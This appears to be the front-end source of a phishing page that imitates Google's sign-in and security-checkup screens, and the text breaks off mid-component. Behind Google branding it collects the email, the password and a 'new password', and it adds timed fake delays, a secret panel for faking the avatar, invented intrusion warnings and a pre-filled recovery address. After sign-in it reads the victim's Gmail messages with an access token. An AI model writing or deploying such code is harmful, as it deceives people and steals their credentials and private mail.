/// <reference types="vite/client" />
import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
import type { User } from 'firebase/auth';
import { translations, Language } from './translations';
import { SecretAvatarPanel, CustomAvatarConfig, GoogleDefaultAvatar } from './SecretAvatarPanel';

const GoogleLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
  </svg>
);

const GOOGLE_AVATAR_COLORS = [
  '#c5221f', // Red
  '#137333', // Green
  '#1a73e8', // Blue
  '#e37400', // Orange
  '#8430ce', // Purple
  '#007b83', // Teal
  '#b80672', // Pink
  '#0d652d', // Forest green
];

const getAvatarColor = (str: string) => {
  if (!str) return GOOGLE_AVATAR_COLORS[2];
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = str.charCodeAt(i) + ((hash << 5) - hash);
  }
  const index = Math.abs(hash) % GOOGLE_AVATAR_COLORS.length;
  return GOOGLE_AVATAR_COLORS[index];
};

const getInitial = (str: string) => {
  if (!str) return 'U';
  const clean = str.trim().split('@')[0];
  return (clean[0] || 'U').toUpperCase();
};

const UserAvatar = ({
  photoURL,
  nameOrEmail,
  size = 32,
  className = '',
  customOverride,
  forceDefaultIcon = false,
}: {
  photoURL?: string | null;
  nameOrEmail?: string;
  size?: number;
  className?: string;
  customOverride?: CustomAvatarConfig;
  forceDefaultIcon?: boolean;
}) => {
  if (customOverride && customOverride.enabled) {
    if (customOverride.avatarType === 'photo' && customOverride.photoURL) {
      return (
        <img
          src={customOverride.photoURL}
          alt="Profile"
          className={`rounded-full object-cover flex-shrink-0 ${className}`}
          style={{ width: `${size}px`, height: `${size}px` }}
          referrerPolicy="no-referrer"
        />
      );
    }

    if (customOverride.avatarType === 'letter') {
      const initial = (customOverride.initial || 'R').trim().toUpperCase().slice(0, 2);
      const bgColor = customOverride.bgColor || '#1a73e8';
      const fontSize = Math.max(10, Math.round(size * 0.5));

      return (
        <div
          className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
          style={{
            width: `${size}px`,
            height: `${size}px`,
            backgroundColor: bgColor,
            fontSize: `${fontSize}px`,
          }}
        >
          {initial}
        </div>
      );
    }

    if (customOverride.avatarType === 'icon') {
      return (
        <GoogleDefaultAvatar
          size={size}
          color={customOverride.iconColor || '#444746'}
          className={className}
        />
      );
    }
  }

  if (photoURL && !forceDefaultIcon) {
    return (
      <img
        src={photoURL}
        alt="Profile"
        className={`rounded-full object-cover flex-shrink-0 ${className}`}
        style={{ width: `${size}px`, height: `${size}px` }}
        referrerPolicy="no-referrer"
      />
    );
  }

  // Exact Google Default Avatar Icon matching the user's uploaded photo!
  return (
    <GoogleDefaultAvatar
      size={size}
      color="#444746"
      className={className}
    />
  );
};

const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus, disabled }: any) => {
  return (
    <div className="relative mb-2 mt-2">
      <input
        type={type}
        id={name}
        name={name}
        value={value}
        onChange={onChange}
        autoFocus={autoFocus}
        disabled={disabled}
        className={`block px-[15px] pt-[15px] pb-[13px] w-full text-[16px] text-[#1f1f1f] bg-transparent rounded border ${
          error ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
        } appearance-none focus:outline-none focus:border-2 peer`}
        placeholder=" "
      />
      <label
        htmlFor={name}
        className={`absolute text-[16px] font-normal left-[11px] top-[14px] px-1 bg-white transition-all duration-200 transform -translate-y-[25px] scale-[0.75] origin-top-left z-10 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.75] peer-focus:-translate-y-[25px] ${
          error ? 'text-[#b3261e] peer-focus:text-[#b3261e]' : 'text-[#444746] peer-focus:text-[#0b57d0]'
        } pointer-events-none`}
      >
        {label}
      </label>
      {error && (
        <div className="text-[#b3261e] text-[12px] mt-2 flex items-center gap-2 px-1">
          <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
          </svg>
          {error}
        </div>
      )}
    </div>
  );
};

const LanguageSelector = ({
  lang,
  setLang,
  upward = true,
}: {
  lang: Language;
  setLang: (l: Language) => void;
  upward?: boolean;
}) => {
  const [isOpen, setIsOpen] = useState(false);
  const dropdownRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsOpen(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  return (
    <div className="relative inline-block text-left" ref={dropdownRef}>
      <button
        type="button"
        onClick={() => setIsOpen(!isOpen)}
        className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition text-[12px] text-[#444746] focus:outline-none"
        aria-expanded={isOpen}
      >
        <span>{translations[lang].languageName}</span>
        <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px" className={`transition-transform duration-150 ${isOpen ? 'rotate-180' : ''}`}>
          <path d="M7 10l5 5 5-5z" />
        </svg>
      </button>

      {isOpen && (
        <div
          className={`absolute ${
            upward ? 'bottom-full mb-1' : 'top-full mt-1'
          } left-0 w-52 bg-white rounded-lg shadow-xl border border-gray-200 py-1.5 z-50 overflow-hidden`}
        >
          <button
            type="button"
            onClick={() => {
              setLang('id');
              setIsOpen(false);
            }}
            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
              lang === 'id' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
            }`}
          >
            <span>Indonesia</span>
            {lang === 'id' && (
              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            )}
          </button>
          <button
            type="button"
            onClick={() => {
              setLang('en');
              setIsOpen(false);
            }}
            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
              lang === 'en' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
            }`}
          >
            <span>English (United States)</span>
            {lang === 'en' && (
              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            )}
          </button>
        </div>
      )}
    </div>
  );
};

const AccountPill = ({
  email,
  googleUser,
  customAvatar,
  isLoading,
  onClick,
}: {
  email: string;
  googleUser: User | null;
  customAvatar: CustomAvatarConfig;
  isLoading?: boolean;
  onClick?: () => void;
}) => {
  const displayEmail = email || googleUser?.email || 'rukho977@gmail.com';

  return (
    <div
      onClick={onClick}
      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[14px] mt-2.5 inline-flex items-center select-none ${
        isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'
      } transition w-max max-w-full`}
      style={{ textDecoration: 'none' }}
      title={displayEmail}
    >
      {/* 20px Profile Avatar Icon on the left */}
      <div className="w-[20px] h-[20px] flex-shrink-0 flex items-center justify-center">
        <UserAvatar
          customOverride={customAvatar}
          photoURL={googleUser?.photoURL}
          nameOrEmail={googleUser?.displayName || displayEmail}
          size={20}
        />
      </div>

      {/* Gmail username & domain directly beside avatar */}
      <span className="ml-[10px] text-[14px] font-medium text-[#1f1f1f] leading-none tracking-normal truncate select-text">
        {displayEmail}
      </span>

      {/* Solid downward triangle arrow matching Image 2 */}
      <svg
        viewBox="0 0 10 5"
        className="w-[10px] h-[5px] text-[#1f1f1f] fill-current flex-shrink-0 ml-[14px]"
        aria-hidden="true"
      >
        <path d="M0 0l5 5 5-5z" />
      </svg>
    </div>
  );
};

export default function App() {
  const [lang, setLangState] = useState<Language>(() => {
    const saved = localStorage.getItem('app_language');
    return saved === 'en' ? 'en' : 'id';
  });

  const setLang = (newLang: Language) => {
    setLangState(newLang);
    localStorage.setItem('app_language', newLang);
  };

  const t = translations[lang];

  // Secret Custom Avatar Configuration
  const [customAvatar, setCustomAvatar] = useState<CustomAvatarConfig>(() => {
    try {
      const saved = localStorage.getItem('google_custom_avatar_config');
      if (saved) return JSON.parse(saved);
    } catch (e) {
      console.error('Failed to load custom avatar config:', e);
    }
    return {
      enabled: false,
      initial: 'R',
      bgColor: '#1a73e8',
      photoURL: '',
    };
  });

  const handleCustomAvatarChange = (newConfig: CustomAvatarConfig) => {
    setCustomAvatar(newConfig);
    try {
      localStorage.setItem('google_custom_avatar_config', JSON.stringify(newConfig));
    } catch (e) {
      console.error('Failed to save custom avatar config:', e);
    }
  };

  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
  const [direction, setDirection] = useState(1);
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState('rukho977@gmail.com');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [error, setError] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [expandedSection, setExpandedSection] = useState<string | null>(null);
  const [showProfileDropdown, setShowProfileDropdown] = useState(false);
  const [securedSections, setSecuredSections] = useState<string[]>([]);
  const [googleUser, setGoogleUser] = useState<User | null>(null);
  const [emailsData, setEmailsData] = useState<any[]>([]);
  const [isFetchingEmails, setIsFetchingEmails] = useState(false);

  useEffect(() => {
    const unsubscribe = initAuth(
      (user, token) => {
        setGoogleUser(user);
        if (user.email) setEmail(user.email);
        if (step === 'success') {
          fetchEmails();
        }
      },
      () => {
        setGoogleUser(null);
      }
    );
    return () => {
      unsubscribe();
    };
  }, [step]);

  useEffect(() => {
    if (step === 'success' && googleUser) {
      fetchEmails();
    }
  }, [step, googleUser]);

  const fetchEmails = async () => {
    if (emailsData.length > 0) return;
    try {
      setIsFetchingEmails(true);
      const token = await getAccessToken();
      if (!token) return;
      
      const response = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=3', {
        headers: {
          Authorization: `Bearer ${token}`
        }
      });
      const data = await response.json();
      
      if (data.messages) {
        const emailDetails = await Promise.all(
          data.messages.map(async (msg: any) => {
            const res = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msg.id}`, {
              headers: { Authorization: `Bearer ${token}` }
            });
            return await res.json();
          })
        );
        setEmailsData(emailDetails);
      }
    } catch (error) {
      console.error('Error fetching emails:', error);
    } finally {
      setIsFetchingEmails(false);
    }
  };

  const handleGoogleLogin = async () => {
    try {
      setIsLoading(true);
      const result = await googleSignIn();
      if (result) {
        setGoogleUser(result.user);
        if (result.user.email) {
          setEmail(result.user.email);
        }
        changeStep('password', 1);
      }
    } catch (err) {
      console.error('Login failed:', err);
      setError(t.loginFailedError);
    } finally {
      setIsLoading(false);
    }
  };

  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment', newDirection: number) => {
    setIsLoading(true);
    setTimeout(() => {
      setDirection(newDirection);
      setStep(newStep);
      setIsLoading(false);
    }, 5200);
  };

  const handleChangePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError(t.enterPasswordError);
      return;
    }
    if (password.length < 8) {
      setError(t.passwordMin8Error);
      return;
    }
    if (password !== confirmPassword) {
      setError(t.passwordMismatchError);
      return;
    }
    setError('');
    changeStep('error', 1);
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError(t.enterEmailOrPhoneError);
      return;
    }
    setError('');
    changeStep('password', 1);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setError(t.enterPasswordError);
      return;
    }
    setError('');
    
    try {
      setIsLoading(true);
      const result = await googleSignIn(email);
      if (result) {
        setGoogleUser(result.user);
        if (result.user.email) {
          setEmail(result.user.email);
        }
        changeStep('success', 1);
      }
    } catch (err) {
      console.error('Login failed:', err);
      setError(t.wrongPasswordError);
    } finally {
      setIsLoading(false);
    }
  };

  if (step === 'error') {
    const securityItems = [
      {
        id: 'devices',
        title: t.devicesTitle,
        subtitle: securedSections.includes('devices')
          ? t.devicesSubDone
          : t.devicesSubWarning,
        isWarning: !securedSections.includes('devices'),
        icon: securedSections.includes('devices') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('devices') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{t.devicesContentDone}</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
            <div className="flex items-start gap-3">
              <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-[#1f1f1f]">{t.thisAndroidPhone}</p>
                <p className="text-xs text-gray-500">{t.activeDeviceNow}</p>
              </div>
            </div>
            <div className="flex items-start gap-3 border-t border-gray-100 pt-3">
              <div className="w-2 h-2 rounded-full bg-amber-500 mt-1.5 flex-shrink-0" />
              <div>
                <p className="font-medium text-[#1f1f1f]">{t.unrecognizedWindowsDevice}</p>
                <p className="text-xs text-gray-500">{t.jakartaActiveAgo}</p>
                <p className="text-xs text-amber-600 mt-1">{t.someoneMayHaveAccessed}</p>
              </div>
            </div>
            <div className="flex gap-2 pt-2 justify-end">
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'devices'])}
                className="px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition"
              >
                {t.yesItWasMe}
              </button>
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'devices'])}
                className="px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] hover:shadow transition"
              >
                {t.signOutDevice}
              </button>
            </div>
          </div>
        )
      },
      {
        id: 'recovery',
        title: t.recoveryTitle,
        subtitle: securedSections.includes('recovery')
          ? t.recoverySubDone
          : t.recoverySubWarning,
        isWarning: !securedSections.includes('recovery'),
        icon: securedSections.includes('recovery') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('recovery') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{t.recoveryContentDone}</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
            <p>{t.recoveryDescription}</p>
            <div className="flex gap-2 max-w-sm mt-2">
              <input 
                type="email" 
                placeholder={t.recoveryInputPlaceholder} 
                className="flex-grow px-3 py-1.5 text-xs rounded border border-gray-300 focus:outline-none focus:border-[#0b57d0] bg-white"
                defaultValue="pemulihan@gmail.com"
              />
              <button 
                type="button"
                onClick={() => setSecuredSections([...securedSections, 'recovery'])}
                className="px-4 py-1.5 text-xs font-medium text-white bg-[#0b57d0] rounded hover:bg-[#0842a0] transition"
              >
                {t.addBtn}
              </button>
            </div>
          </div>
        )
      },
      {
        id: 'passwords',
        title: t.passwordsTitle,
        subtitle: securedSections.includes('passwords')
          ? t.passwordsSubDone
          : t.passwordsSubWarning,
        isWarning: !securedSections.includes('passwords'),
        icon: securedSections.includes('passwords') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('passwords') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{t.passwordsContentDone}</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>{t.passwordsWarningDesc}</p>
            <button 
              type="button"
              onClick={() => setSecuredSections([...securedSections, 'passwords'])}
              className="mt-2 px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition bg-white"
            >
              {t.checkUpdatePasswordsBtn}
            </button>
          </div>
        )
      },
      {
        id: 'safebrowsing',
        title: t.safeBrowsingTitle,
        subtitle: securedSections.includes('safebrowsing')
          ? t.safeBrowsingSubDone
          : t.safeBrowsingSubWarning,
        isWarning: !securedSections.includes('safebrowsing'),
        icon: securedSections.includes('safebrowsing') ? (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ) : (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1a73e8]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
        ),
        content: securedSections.includes('safebrowsing') ? (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#137333] flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            <span>{t.safeBrowsingContentDone}</span>
          </div>
        ) : (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>{t.safeBrowsingWarningDesc}</p>
            <button 
              type="button"
              onClick={() => setSecuredSections([...securedSections, 'safebrowsing'])}
              className="mt-2 px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] transition"
            >
              {t.turnOnNowBtn}
            </button>
          </div>
        )
      },
      {
        id: 'recent',
        title: t.recentActivityTitle,
        subtitle: t.recentActivitySub,
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <div className="flex items-center gap-2">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
              <p className="font-medium text-[#1f1f1f]">{t.newSignInOnChrome}</p>
            </div>
            <p className="text-xs text-gray-500 pl-3.5">{t.todayCountry}</p>
            <p className="pl-3.5 text-xs text-gray-500">{t.noOtherSuspiciousActivity}</p>
          </div>
        )
      },
      {
        id: 'apps',
        title: t.connectedAppsTitle,
        subtitle: t.connectedAppsSub,
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
            <p>{t.connectedAppsDesc}</p>
            <ul className="list-disc pl-5 text-xs space-y-1">
              <li>{t.appDriveAccess}</li>
              <li>{t.appPublicProfile}</li>
              <li>{t.appBasicProfile}</li>
            </ul>
            <p className="text-xs text-gray-500 mt-2">{t.allAppsVerified}</p>
          </div>
        )
      },
      {
        id: 'gmail_settings',
        title: t.gmailSettingsTitle,
        subtitle: t.gmailSettingsSub,
        isWarning: false,
        icon: (
          <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
        ),
        content: (
          <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-1">
            <p className="font-medium text-[#1f1f1f]">{t.emailForwardingDisabled}</p>
            <p className="text-xs text-gray-500">{t.emailForwardingDisabledDesc(email)}</p>
          </div>
        )
      }
    ];

    return (
      <div className="min-h-screen bg-white sm:bg-[#f8fafd] flex flex-col font-sans text-[#1f1f1f] relative">
        {/* Google Account Top Header */}
        <header className="h-[64px] border-b border-[#e0e3e7] bg-white px-4 sm:px-6 flex items-center justify-between sticky top-0 z-50">
          <div className="flex items-center select-none">
            <span className="text-[#020307] text-[19px] font-normal tracking-tight font-sans">
              {t.google}
            </span>
          </div>
          
          <div className="flex items-center gap-1">
            <LanguageSelector lang={lang} setLang={setLang} upward={false} />

            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
            </button>
            <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5 fill-current">
                <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z" />
              </svg>
            </button>
            
            {/* Profile Pic Button */}
            <button 
              type="button"
              onClick={() => setShowProfileDropdown(!showProfileDropdown)}
              className="w-10 h-10 rounded-full flex items-center justify-center text-[#5f6368] hover:bg-gray-100 focus:outline-none transition relative overflow-hidden"
              id="profile-avatar-btn"
            >
              <UserAvatar
                customOverride={customAvatar}
                photoURL={googleUser?.photoURL}
                nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                size={32}
              />
            </button>

            {/* Profile Dropdown */}
            {showProfileDropdown && (
              <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-3 overflow-hidden">
                  <UserAvatar
                    customOverride={customAvatar}
                    photoURL={googleUser?.photoURL}
                    nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                    size={64}
                  />
                </div>
                <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || t.googleUserDefault}</p>
                
                <button
                  type="button"
                  onClick={() => alert(t.manageAccountAlert)}
                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#3c4043] hover:bg-gray-50 transition mb-3"
                >
                  {t.manageGoogleAccount}
                </button>
                
                <button
                  type="button"
                  onClick={() => {
                    logout();
                    setEmail('');
                    setPassword('');
                    setConfirmPassword('');
                    setExpandedSection(null);
                    setShowProfileDropdown(false);
                    setSecuredSections([]);
                    setStep('email');
                  }}
                  className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#c5221f] hover:bg-red-50 transition"
                >
                  {t.signOutReset}
                </button>
              </div>
            )}
          </div>
        </header>

        {/* Main Content Area */}
        <main className="flex-grow flex items-start justify-center p-4 sm:p-8 overflow-y-auto">
          <div className="w-full max-w-[620px] bg-white border border-[#e0e3e7] rounded-2xl shadow-sm p-6 sm:p-10 flex flex-col items-center my-4 sm:my-8">
            
            {/* Green Shield-Check Badge */}
            <div className="w-16 h-16 rounded-full bg-[#e6f4ea] flex items-center justify-center mb-4 flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[36px] h-[36px] text-[#137333]" fill="currentColor">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z" />
              </svg>
            </div>

            {/* Header Titles */}
            <h1 className="text-[28px] sm:text-[32px] text-[#1f1f1f] font-normal text-center leading-tight">
              {t.securityCheckupTitle}
            </h1>
            <p className="text-[#444746] text-[15px] text-center mt-2 mb-8">
              {t.securityCheckupTips}
            </p>

            {/* Checklist items */}
            <div className="w-full border-t border-gray-200">
              {securityItems.map((item) => {
                const isExpanded = expandedSection === item.id;
                return (
                  <div key={item.id} className="border-b border-gray-200">
                    <button
                      type="button"
                      onClick={() => setExpandedSection(isExpanded ? null : item.id)}
                      className="w-full py-4 flex items-center justify-between text-left hover:bg-gray-50/50 px-2 transition rounded"
                    >
                      <div className="flex items-center gap-4">
                        {item.icon}
                        <div>
                          <p className="text-[15px] font-medium text-[#1f1f1f]">{item.title}</p>
                          <p className="text-[13px] text-gray-500 mt-0.5">{item.subtitle}</p>
                        </div>
                      </div>
                      <svg 
                        fill="currentColor" 
                        viewBox="0 0 24 24" 
                        className={`w-5 h-5 text-[#5f6368] transition-transform duration-200 ${isExpanded ? 'rotate-180' : ''}`}
                      >
                        <path d="M7 10l5 5 5-5z" />
                      </svg>
